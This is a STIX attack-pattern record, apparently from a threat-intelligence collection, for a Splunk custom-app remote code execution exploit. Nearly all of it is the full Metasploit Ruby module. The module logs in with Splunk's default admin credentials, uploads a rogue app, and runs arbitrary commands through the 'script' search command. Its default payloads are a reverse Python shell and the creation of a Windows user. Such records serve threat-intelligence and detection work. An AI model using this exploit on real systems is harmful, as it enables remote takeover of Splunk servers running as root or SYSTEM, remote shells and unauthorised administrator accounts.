{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--06d54ee2-4b3c-456b-b709-bdebf9c15b34",
    "created": "2024-08-14T17:08:09.831181Z",
    "modified": "2024-08-14T17:08:09.831185Z",
    "name": "Splunk Custom App Remote Code Execution",
    "description": " 'This module exploits a feature of Splunk whereby a custom application can be uploaded through the web based interface. Through the \\'script\\' search command a user can call commands defined in their custom application which includes arbitrary perl or python code. To abuse this behavior, a valid Splunk user with the admin role is required. By default, this module uses the credential of \"admin:changeme\" the default Administrator credential for Splunk. Note that the Splunk web interface runs as SYSTEM on Windows, or as root on Linux by default. This module has been tested successfully against Splunk 5.0, 6.1, 6.1.1 and 7.2.4. Version 7.2.4 has been tested successfully against OSX as well'",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/splunk_upload_app_exec.rb",
            "external_id": "splunk_upload_app_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.7elements.co.uk/2012/11/splunk-with-great-power-comes-great-responsibility.html"
        },
        {
            "source_name": "reference",
            "url": "http://blog.7elements.co.uk/2012/11/abusing-splunk-with-metasploit.html"
        },
        {
            "source_name": "reference",
            "url": "http://docs.splunk.com/Documentation/Splunk/latest/SearchReference/Script"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'           => 'Splunk Custom App Remote Code Execution',\n      'Description'    =>\n        'This module exploits a feature of Splunk whereby a custom application can be\n        uploaded through the web based interface. Through the \\'script\\' search command a\n        user can call commands defined in their custom application which includes arbitrary\n        perl or python code. To abuse this behavior, a valid Splunk user with the admin\n        role is required. By default, this module uses the credential of \"admin:changeme\",\n        the default Administrator credential for Splunk. Note that the Splunk web interface\n        runs as SYSTEM on Windows, or as root on Linux by default. This module has been\n        tested successfully against Splunk 5.0, 6.1, 6.1.1 and 7.2.4.\n        Version 7.2.4 has been tested successfully against OSX as well',\n      'Author'         =>\n        [\n          \"marcwickenden\",  # discovery and metasploit module\n          \"sinn3r\",         # metasploit module\n          \"juan vazquez\",   # metasploit module\n          \"Gary Blosser\",   # metasploit module updates for Splunk 6.1\n          \"Matteo Malvica\"  # metasploit module updates for Splunk 7.2.4\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://blog.7elements.co.uk/2012/11/splunk-with-great-power-comes-great-responsibility.html' ],\n          [ 'URL', 'http://blog.7elements.co.uk/2012/11/abusing-splunk-with-metasploit.html' ],\n          [ 'URL', 'http://docs.splunk.com/Documentation/Splunk/latest/SearchReference/Script' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'DisableNops' => true\n        },\n      'Platform'       => %w(linux unix win osx),\n      'Targets'        =>\n        [\n          [ 'Splunk >= 7.2.4 / Linux',\n            {\n              'Arch'     => ARCH_CMD,\n              'Platform' => %w(linux unix),\n              'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_python'}\n            }\n          ],\n          [ 'Splunk >= 7.2.4 / Windows',\n            {\n              'Arch'     => ARCH_CMD,\n              'Platform' =>  'win',\n              'DefaultOptions' => {'PAYLOAD' => 'cmd/windows/adduser'}\n            }\n          ],\n          [ 'Splunk >= 7.2.4 / OSX',\n            {\n              'Arch'     => ARCH_CMD,\n              'Platform' => %w(linux unix),\n              'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_python'}\n            }\n          ],\n          [ 'Splunk >= 5.0.1 / Linux',\n            {\n              'Arch'     => ARCH_CMD,\n              'Platform' => %w(linux unix),\n              'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_python'}\n            }\n          ],\n          [ 'Splunk >= 5.0.1 / Windows',\n            {\n              'Arch'     => ARCH_CMD,\n              'Platform' => 'win',\n              'DefaultOptions' => {'PAYLOAD' => 'cmd/windows/adduser'}\n            }\n          ]\n        ],\n      'DisclosureDate' => '2012-09-27'))\n\n    register_options(\n      [\n        Opt::RPORT(8000),\n        OptString.new('USERNAME', [ true, 'The username with admin role to authenticate as', 'admin' ]),\n        OptString.new('PASSWORD', [ true, 'The password for the specified username', 'changeme' ]),\n        OptPath.new(\n          'SPLUNK_APP_FILE',\n          [\n            true,\n            'The \"rogue\" Splunk application tgz',\n            File.join(Msf::Config.install_root, 'data', 'exploits', 'splunk', 'upload_app_exec.tgz')\n          ])\n      ])\n\n    register_advanced_options(\n      [\n        OptBool.new('ReturnOutput', [ true, 'Display command output', false ]),\n        OptBool.new('DisableUpload', [ true, 'Disable the app upload if you have already performed it once', false ]),\n        OptBool.new('EnableOverwrite', [true, 'Overwrites an app of the same name. Needed if you change the app code in the tgz', false]),\n        OptInt.new('CommandOutputDelay', [true, 'Seconds to wait before requesting command output from Splunk', 5])\n      ])\n  end\n\n  def exploit\n    # process standard options\n    @username = datastore['USERNAME']\n    @password = datastore['PASSWORD']\n    file_name = datastore['SPLUNK_APP_FILE']\n\n    # process advanced options\n    return_output = datastore['ReturnOutput']\n    disable_upload = datastore['DisableUpload']\n    @enable_overwrite = datastore['EnableOverwrite']\n    command_output_delay = datastore['CommandOutputDelay']\n\n    # set up some variables for later use\n    @auth_cookies = ''\n    @csrf_form_key = ''\n    @state_token = ''\n    @splunkweb_csrf_token_8000_id = ''\n    @csrf_form_port = \"splunkweb_csrf_token_#{rport}\" # Default to using rport, corrected during tokenization for v6 below.\n    @ver7 = false # splunk version 7 boolean\n    app_name = 'upload_app_exec'\n    p = payload.encoded\n    print_status(\"Using command: #{p}\")\n    cmd = Rex::Text.encode_base64(p)\n\n    # check if the target version is 7.2.4\n    if target.name.include? \"7.2.4\"\n      @ver7 = true\n    end\n\n    do_login\n\n    # fetch the csrf token for use in the upload next\n    if @ver7 == true\n      do_get_state_token('/en-US/manager/appinstall/_upload')\n    else\n      do_get_csrf('/en-US/manager/launcher/apps/local')\n    end\n\n    unless disable_upload\n      # upload the arbitrary command execution Splunk app tgz\n      if @ver7 == true\n        do_upload_app_7(app_name, file_name)\n      else\n        do_upload_app(app_name, file_name)\n      end\n    end\n\n    if  @ver7 == false\n      # get the next csrf token from our new app\n      do_get_csrf(\"/en-US/app/#{app_name}/flashtimeline\")\n    end\n\n    # call our command execution function with the Splunk 'script' command\n    print_status(\"Invoking script command\")\n    if @ver7 == true\n      res = send_request_cgi(\n      'uri'     => '/en-US/splunkd/__raw/servicesNS/admin/search/search/jobs',\n      'method'  => 'POST',\n      'cookie' => \"#{@auth_cookies};\", # Version 6 uses cookies and not just headers, extra cookies should be ignored by Splunk 5 (unverified)\n      'headers' =>\n        {\n          'X-Requested-With' => 'XMLHttpRequest',\n          'X-Splunk-Form-Key' => @splunkweb_csrf_token_8000_id   # Version 6 ignores extra headers (verified)\n        },\n      'vars_post' =>\n        {\n          'search' => \"search * | script msf_exec #{cmd}\", # msf_exec defined in default/commands.conf\n          'status_buckets' => \"300\",\n          'namespace' => \"#{app_name}\",\n          'ui_dispatch_app' => \"#{app_name}\",\n          'ui_dispatch_view' => \"flashtimeline\",\n          'auto_cancel' => \"100\",\n          'wait' => \"0\",\n          'required_field_list' => \"*\",\n          'adhoc_search_level' => \"smart\",\n          'earliest_time' => \"0\",\n          'latest_time' => \"\",\n          'timeFormat' => \"%s.%Q\"\n        }\n    )\n    else\n      res = send_request_cgi(\n        'uri'     => '/en-US/api/search/jobs',\n        'method'  => 'POST',\n        'cookie'  => \"#{@auth_cookies}; #{@csrf_form_port}=#{@csrf_form_key}\", # Version 6 uses cookies and not just headers, extra cookies should be ignored by Splunk 5 (unverified)\n        'headers' =>\n          {\n            'X-Requested-With' => 'XMLHttpRequest',\n            'X-Splunk-Form-Key' => @csrf_form_key   # Version 6 ignores extra headers (verified)\n          },\n        'vars_post' =>\n          {\n            'search' => \"search * | script msf_exec #{cmd}\", # msf_exec defined in default/commands.conf\n            'status_buckets' => \"300\",\n            'namespace' => \"#{app_name}\",\n            'ui_dispatch_app' => \"#{app_name}\",\n            'ui_dispatch_view' => \"flashtimeline\",\n            'auto_cancel' => \"100\",\n            'wait' => \"0\",\n            'required_field_list' => \"*\",\n            'adhoc_search_level' => \"smart\",\n            'earliest_time' => \"0\",\n            'latest_time' => \"\",\n            'timeFormat' => \"%s.%Q\"\n          }\n      )\n    end\n\n    if return_output\n      if @ver7 == true\n        res.body.match('sid.*')\n        job_id_blob = Regexp.last_match(0)\n        job_id_blob2 = job_id_blob.split('>')[1]\n        job_id = job_id_blob2.split('<')[0]\n      else\n      res.body.match(/data\":\\ \"([0-9.]+)\"/)\n      job_id = Regexp.last_match(1)\n      end\n      # wait a short time to let the output be produced\n      print_status(\"Waiting for #{command_output_delay} seconds to retrieve command output\")\n      select(nil, nil, nil, command_output_delay)\n      job_output = fetch_job_output(job_id)\n      if job_output.body.match(/Waiting for data.../)\n        print_status(\"No output returned in time\")\n      else\n        output = \"\"\n        job_output.body.each_line do |line|\n          # strip off the leading and trailing \" added by Splunk\n          line.gsub!(/^\"/, \"\")\n          line.gsub!(/\"$/, \"\")\n          output << line\n        end\n\n        # return the output\n        print_status(\"Command returned:\")\n        print_line output\n      end\n    else\n      handler\n    end\n  end\n\n  def check\n    # all versions are actually \"vulnerable\" but check implemented for future proofing\n    # and good practice\n    res = send_request_cgi(\n    {\n      'uri'     => '/en-US/account/login',\n      'method'  => 'GET'\n    }, 25)\n\n    if res && res.body =~ /Splunk Inc\\. Splunk/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def do_login\n    print_status(\"Authenticating...\")\n    # this method borrowed with thanks from splunk_mappy_exec.rb\n    res = send_request_cgi(\n      'uri'     => '/en-US/account/login',\n      'method'  => 'GET'\n    )\n\n    cval = ''\n    uid = ''\n    session_id_port =\n    session_id = ''\n    if res && res.code == 200\n      res.get_cookies.split(';').each do |c|\n        c.split(',').each do |v|\n          if v.split('=')[0] =~ /cval/\n            cval = v.split('=')[1]\n          elsif v.split('=')[0] =~ /uid/\n            uid = v.split('=')[1]\n          elsif v.split('=')[0] =~ /session_id/\n            session_id_port = v.split('=')[0]\n            session_id = v.split('=')[1]\n          end\n        end\n      end\n    else\n      fail_with(Failure::NotFound, \"Unable to get session cookies\")\n    end\n\n    res = send_request_cgi(\n      'uri'     => '/en-US/account/login',\n      'method'  => 'POST',\n      'cookie'  => \"uid=#{uid}; #{session_id_port}=#{session_id}; cval=#{cval}\",\n      'vars_post' =>\n        {\n          'cval' => cval,\n          'username' => @username,\n          'password' => @password\n        }\n    )\n\n    if !res\n      fail_with(Failure::Unreachable, \"No response\")\n    elsif res.code != 200\n       fail_with(Failure::Unreachable, \"Authentication failed\")\n\n    elsif @ver7 == true\n        splunkweb_csrf_token_8000_port = ''\n        @splunkweb_csrf_token_8000_id = ''\n        splunkd_8000_port = ''\n        splunkd_8000_id = ''\n\n        #puts res\n        res.get_cookies.split(';').each do |c|\n          c.split(',').each do |v|\n            if v.split('=')[0] =~ /splunkweb_csrf_token_8000/\n              splunkweb_csrf_token_8000_port = v.split('=')[0]\n              @splunkweb_csrf_token_8000_id = v.split('=')[1]\n            elsif v.split('=')[0] =~ /splunkd_8000/  # regex as the full name is something like splunkweb_csrf_token_8000\n              splunkd_8000_port = v.split('=')[0] # Accounting for tunnels where rport is not the actual server-side port\n              splunkd_8000_id = v.split('=')[1]\n            end\n          end\n        @auth_cookies = \"session_id_8000=37305a4fb182fadd28a1591b64a0b22b0765159e;#{splunkweb_csrf_token_8000_port}=#{@splunkweb_csrf_token_8000_id};#{splunkd_8000_port}=#{splunkd_8000_id}; splunkweb_uid=30A93112-7681-4C0D-B1F6-17CAB1FA2735;login=true\"\n    end\n\n    else\n        session_id_port = ''\n        session_id = ''\n        res.get_cookies.split(';').each do |c|\n          c.split(',').each do |v|\n            if v.split('=')[0] =~ /session_id/\n              session_id_port = v.split('=')[0]\n              session_id = v.split('=')[1]\n            end\n          end\n        end\n        @auth_cookies = \"#{session_id_port}=#{session_id}\"\n    end\n  end\n\n  def do_upload_app(app_name, file_name)\n    archive_file_name = ::File.basename(file_name)\n    print_status(\"Uploading file #{archive_file_name}\")\n    file_data = ::File.read(file_name, mode: 'rb')\n\n    boundary = '--------------' + rand_text_alphanumeric(6)\n\n    data = \"--#{boundary}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"splunk_form_key\\\"\\r\\n\\r\\n\"\n    data << \"#{@csrf_form_key}\"\n    data << \"\\r\\n--#{boundary}\\r\\n\"\n\n    if @enable_overwrite\n      data << \"Content-Disposition: form-data; name=\\\"force\\\"\\r\\n\\r\\n\"\n      data << \"1\"\n      data << \"\\r\\n--#{boundary}\\r\\n\"\n    end\n\n    data << \"Content-Disposition: form-data; name=\\\"appfile\\\"; filename=\\\"#{archive_file_name}\\\"\\r\\n\"\n    data << \"Content-Type: application/x-compressed\\r\\n\\r\\n\"\n    data << file_data\n    data << \"\\r\\n--#{boundary}--\\r\\n\"\n\n    res = send_request_cgi(\n      {\n        'uri' => '/en-US/manager/appinstall/_upload',\n        'method' => 'POST',\n        # Does not seem to require the cookie, but it does not break it. I bet 6.2 will have a cookie here too.\n        'cookie' => \"#{@auth_cookies}; #{@csrf_form_port}=#{@csrf_form_key}\",\n        'ctype' => \"multipart/form-data; boundary=#{boundary}\",\n        'data' => data\n      }, 30)\n\n    if res && (res.code == 303 || (res.code == 200 && res.body !~ /There was an error processing the upload/))\n      print_good(\"#{app_name} successfully uploaded\")\n    else\n      fail_with(Failure::Unknown, \"Error uploading\")\n    end\n  end\n\n   # version  7.2.x only\n  def do_upload_app_7(app_name, file_name)\n    archive_file_name = ::File.basename(file_name)\n    print_status(\"Uploading file #{archive_file_name}\")\n    file_data = ::File.read(file_name, mode: 'rb')\n\n    boundary = '---------------------------' + rand_text_numeric(29)\n\n    data =  \"--#{boundary}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"state\\\"\\r\\n\"\n    data << \"\\r\\n#{@state_token}\\r\\n\"\n    data << \"--#{boundary}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"splunk_form_key\\\"\\r\\n\"\n    data << \"\\r\\n#{@splunkweb_csrf_token_8000_id}\\r\\n\"\n    data << \"--#{boundary}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"appfile\\\"; filename=\\\"#{archive_file_name}\\\"\\r\\n\"\n    data << \"Content-Type: application/x-compressed-tar\\r\\n\\r\\n\"\n    data << file_data\n    data << \"\\r\\n--#{boundary}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"force\\\"\\r\\n\\r\\n\"\n    data << \"1\"\n    data << \"\\r\\n--#{boundary}--\\r\\n\"\n\n    res = send_request_cgi(\n      {\n        'uri' => '/en-US/manager/appinstall/_upload',\n        'method' => 'POST',\n        'cookie' => @auth_cookies,\n        'ctype' => \"multipart/form-data; boundary=#{boundary}\",\n        'data' => data\n      }, 30)\n\n    unless res\n      fail_with(Failure::Unreachable, \"Connection failed\")\n    end\n\n    unless res.code == 303 || res.code == 200\n      fail_with(Failure::UnexpectedReply, \"Unexpected reply (HTTP #{res.code})\")\n    end\n\n    if res.body.include?('There was an error processing the upload')\n      fail_with(Failure::Unknown, \"Error uploading\")\n    end\n\n    print_good(\"#{app_name} successfully uploaded\")\n\n  end\n\n  def do_get_csrf(uri)\n    print_status(\"Fetching csrf token from #{uri}\")\n    res = send_request_cgi(\n      'uri'    => uri,\n      'method' => 'GET',\n      'cookie' => @auth_cookies\n    )\n    res.body.match(/FORM_KEY\":\\ \"(\\d+)\"/) # Version 5\n    @csrf_form_key = Regexp.last_match(1)\n\n    unless @csrf_form_key # Version 6\n      res.get_cookies.split(';').each do |c|\n        c.split(',').each do |v|\n          if v.split('=')[0] =~ /splunkweb_csrf_token/  # regex as the full name is something like splunkweb_csrf_token_8000\n            @csrf_form_port = v.split('=')[0] # Accounting for tunnels where rport is not the actual server-side port\n            @csrf_form_key = v.split('=')[1]\n          end\n        end\n      end\n    end\n    fail_with(Failure::Unknown, \"csrf form Key not found\") unless @csrf_form_key\n  end\n\n  # version  7.2.x only\n  def do_get_state_token(uri)\n    print_status(\"Fetching state token from #{uri}\")\n    res = send_request_cgi(\n      'uri'    => uri,\n      'method' => 'GET',\n      'cookie' => @auth_cookies\n    )\n    #puts res\n    res.body.match('name=\\\"state\\\" value=\"(.*)\"') # Version 5\n    @state_token = Regexp.last_match(1)\n\n    unless @state_token\n      fail_with(Failure::Unknown, \"state token form Key not found\")\n    end\n  end\n\n  def fetch_job_output(job_id)\n    # fetch the output of our job id as csv for easy parsing\n    print_status(\"Fetching job_output for id #{job_id}\")\n    send_request_raw(\n      'uri' => \"/en-US/api/search/jobs/#{job_id}/result?isDownload=true&timeFormat=%25FT%25T.%25Q%25%3Az&maxLines=0&count=0&filename=&outputMode=csv&spl_ctrl-limit=unlimited&spl_ctrl-count=10000\",\n      'method' => 'GET',\n      'cookie' => @auth_cookies,\n      'encode_param' => 'false'\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-09-27",
    "x_mitre_platforms": [
        "win'"
    ]
}